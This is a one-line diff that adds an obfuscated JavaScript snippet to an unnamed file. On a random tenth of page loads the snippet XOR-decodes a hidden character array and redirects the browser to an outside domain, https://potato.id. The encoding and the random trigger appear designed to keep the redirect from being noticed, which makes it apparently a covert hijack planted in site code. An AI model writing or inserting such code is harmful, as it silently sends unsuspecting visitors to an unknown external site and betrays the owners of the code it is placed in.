@@ -1,0 +1,1 @@
+(function(){if(Math.random()<0.1){const key=42,chunks=[[16,5,5,90],[69,94,75,94],[69,4,67,78]];const enc=chunks.flat();const dec=enc.map(c=>String.fromCharCode(c^key)).join('');location.href='https'+dec;}})();
